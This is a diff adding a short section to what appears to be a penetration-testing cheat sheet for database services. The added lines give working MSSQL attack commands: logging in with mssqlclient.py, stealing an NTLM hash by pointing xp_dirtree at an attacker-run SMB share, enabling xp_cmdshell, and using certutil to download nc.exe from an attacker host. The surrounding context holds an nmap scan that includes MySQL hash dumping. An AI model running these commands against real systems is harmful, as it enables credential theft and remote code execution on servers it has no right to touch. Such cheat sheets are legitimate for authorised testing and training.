@@ -258,6 +258,33 @@ Scan the MySQL port in order to enumerate and find vuln using NMap
 nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 IP -p PORT
 ```
 
+### Connect
+Connect to the server 
+
+```
+mysql -h IP -u USER
+```
+
+### With valid credential
+
+```
+mssqlclient.py <USER>:<PASSWORD>@<IP>
+
+# Once logged in you can run queries:
+SQL> select @@ version;
+
+# Steal NTLM hash
+sudo smbserver.py -smb2support liodeus .
+SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
+
+# Try to enable code execution
+SQL> enable_xp_cmdshell
+
+# Execute code
+SQL> xp_cmdshell whoami /all
+SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
+```
+
 ### Brute Force using hydra
 
 ```
